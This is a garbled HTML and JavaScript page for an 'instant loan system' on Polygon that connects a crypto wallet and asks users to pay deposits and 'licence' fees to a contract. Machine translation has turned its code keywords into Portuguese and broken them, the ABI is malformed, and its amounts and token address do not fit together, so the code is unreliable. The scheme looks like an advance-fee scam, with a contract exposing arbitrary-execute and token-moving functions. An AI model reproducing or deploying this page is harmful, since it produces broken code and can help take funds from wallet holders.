< !DOCTYPEhtml >
< html lang = "pt" >
< cabe�a >
    < meta charset = "UTF-8" >
    < meta name = "viewport" content = "largura=largura do dispositivo, escala inicial=1,0" >
    < title > Sistema de Empr�stimo Instant�neo</title>
    <estilo>
        corpo {
            cor de fundo: #121212;
            cor: #FFFFFF;
            fam�lia de fontes: Arial, sem serifa;
        }
        .cont�iner {
            largura m�xima: 800px;
margem: autom�tico;
preenchimento: 20px;
alinhamento de texto: centro;
        }
        .t�tulo {
            tamanho da fonte: 2em;
margem inferior: 20px;
        }
        .se��o {
            margem inferior: 20px;
        }
        .info {
            cor: #00FF00;
        }
        .aviso {
            cor: #FF0000;
        }
        bot�o {
            cor de fundo: #6200EE;
            cor: #FFFFFF;
            fronteira: nenhuma;
preenchimento: 10px 20px;
cursor: ponteiro;
tamanho da fonte: 1em;
        }
        bot�o: passar o mouse {
            cor de fundo: #3700B3;
        }
    </ estilo >
    < script src = "https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js" ></ script >
</ head >
< corpo >
    < div class= "cont�iner" >
        < div class= "title" > Sistema de Empr�stimo Instant�neo</div>
        <div class= "informa��es da se��o" >
            Operando na rede Polygon (Matic)
        </div>
        <div class= "informa��es da se��o" >
            Todas as transa��es em USDT
        </div>
        <div class= "se��o" >
            < button id = "connectWalletButton" > Conectar Carteira </ button >
        </ div >
        < div class= "se��o aviso" >
            Certifique - se de que sua carteira esteja configurada para a Polygon Network
        </div>
        <div class= "se��o" >
            < button id = "depositButton" style = "display: none;" > Fazer Dep�sito </ button >
            < button id = "purchaseLicenseButton" style = "display: none;" > Comprar Licen�a </ button >
            < button id = "requestLoanButton" style = "display: none;" > Solicitar Empr�stimo </ button >
            < button id = "repayLoanButton" style = "display: none;" > Reembolsar Empr�stimo </ button >
        </ div >
    </ div >
    < roteiro >
        document.addEventListener('DOMContentLoaded', () => {
            const connectWalletButton = document.getElementById('connectWalletButton');
            const depositButton = document.getElementById('depositButton');
            const buyLicenseButton = document.getElementById('purchaseLicenseButton');
            const requestLoanButton = document.getElementById('requestLoanButton');
            const repayLoanButton = document.getElementById('repayLoanButton');

            deixe web3;
            deixe a conta;
            const contractAddress = '0xcE307fd7918E07958bf56ea530DEC93573Bf07bb';
            const contratoABI = [
                { "inputs":[],"name":"constructorWallet","outputs":[{ "internalType":"address","name":"","type":"address"}],"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[],"name":"currentStage","outputs":[{ "internalType":"uint256","name":" ","type":"uint256"}],"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[{ "internalType":"bytes","name":"callData ","type":"bytes"}],"name":"executar","outputs":[],"stateMutability ":"n�o pag�vel","type":"fun��o"},
                { "inputs":[],"name":"invoker","outputs":[{ "internalType":"address","name":"","type":"address"}],"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[{ "internalType":"address","name":"","type":"address"}],"name":"lastLoanTime","outputs":[{ "internalType": "uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
                { "inputs":[],"name":"licenseFeeStage1","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[],"name":"licenseFeeStage2","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[],"name":"loanCooldown","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[{ "internalType":"address","name":"para","type":"address"},{ "internalType":"bytes","name":"dados"," type":"bytes"},{ "internalType":"address","name":"tokenAddress","type":"address"},{ "internalType":"uint256","name":"tokenAmount" ,"type":"uint256"}],"name":"meuMetodo","outputs":[],"stateMutability":"payable","type":"function"},
                { "inputs":[],"name":"payLicense","outputs":[],"stateMutability":"payable","type":"function"},
                { "inputs":[{ "internalType":"address","name":"_invoker","type":"address"}],"name":"setInvoker","outputs":[],"stateMutability ":"n�o pag�vel","type":"fun��o"},
                { "inputs":[],"name":"stage1LoansLimit","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[],"name":"stage2LoansLimit","outputs":[{ "internalType":"uint256","name":"","type":"uint256"}],,"stateMutability" :"visualizar","tipo":"fun��o"},
                { "inputs":[{ "internalType":"address","name":"","type":"address"}],"name":"userLicenses","outputs":[{ "internalType": "uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
                { "inputs":[{ "internalType":"address","name":"","type":"address"}],"name":"userLoanCount","outputs":[{ "internalType": "uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
            ];
deixe contratar;

connectWalletButton.addEventListener('clique', async () => {
se(janela.ethereum) {
    web3 = novo Web3(window.ethereum);
    tentar {
        aguarde window.ethereum.request({ m�todo: 'eth_requestAccounts' });
contas const = aguarda web3.eth.getAccounts();
conta = contas[0];
contrato = novo web3.eth.Contract(contractABI, contractAddress);
showButtons();
                    } pegar(erro) {
    console.error('Erro ao conectar a carteira:', erro);
}
                } outro {
                    alert('Metamask n�o est� instalado!');
                }
            });

depositButton.addEventListener('clique', async () => {
quantidade const = web3.utils.toWei('20', '�ter');
tentar {
    aguardar contrato.methods.meuMetodo(conta, "0x", "0xdAC17F958D2ee523a2206206994597C13D831ec7", valor).send({ de: conta, valor: valor });
alert('Dep�sito realizado com sucesso!');
                } pegar(erro) {
    console.error('Erro ao fazer o dep�sito:', erro);
}
            });

buyLicenseButton.addEventListener('clique', async () => {
    const LicenseFee = web3.utils.toWei('100', 'ether');
    tentar {
        aguardar contrato.methods.payLicense().send({ from: conta, valor: licenceFee });
alert('Licen�a comprada com sucesso!');
                } pegar(erro) {
    console.error('Erro ao comprar a licen�a:', erro);
}
            });

requestLoanButton.addEventListener('clique', async () => {
const empr�stimoAmount = web3.utils.toWei('200', 'ether');
tentar {
    aguardar contrato.methods.meuMetodo(conta, "0x", "0xdAC17F958D2ee523a2206206994597C13D831ec7", lendAmount).send({ de: conta });
alert('Empr�stimo solicitado com sucesso!');
                } pegar(erro) {
    console.error('Erro ao solicitar empr�stimo:', erro);
}
            });

repayLoanButton.addEventListener('clique', async () => {
tentar {
    const empr�stimo = aguardar contrato.methods.userLoanCount(account).call();
    const totalRepayment = web3.utils.toBN(empr�stimo).add(web3.utils.toBN((empr�stimo * 1.1) / 100)); // Exemplo de taxa de juros de 10%
    aguarde contrato.methods.payLicense().send({ de: conta, valor: totalRepayment });
alert('Empr�stimo pago com sucesso!');
                } pegar(erro) {
    console.error('Erro ao pagar o empr�stimo:', erro);
}
            });

fun��o mostrarButtons()
{
    depositButton.style.display = 'bloco embutido';
    buyLicenseButton.style.display = 'bloco embutido';
    requestLoanButton.style.display = 'bloco embutido';
    repayLoanButton.style.display = 'bloco embutido';
}
        });
    </ script >
</ body >
</ html >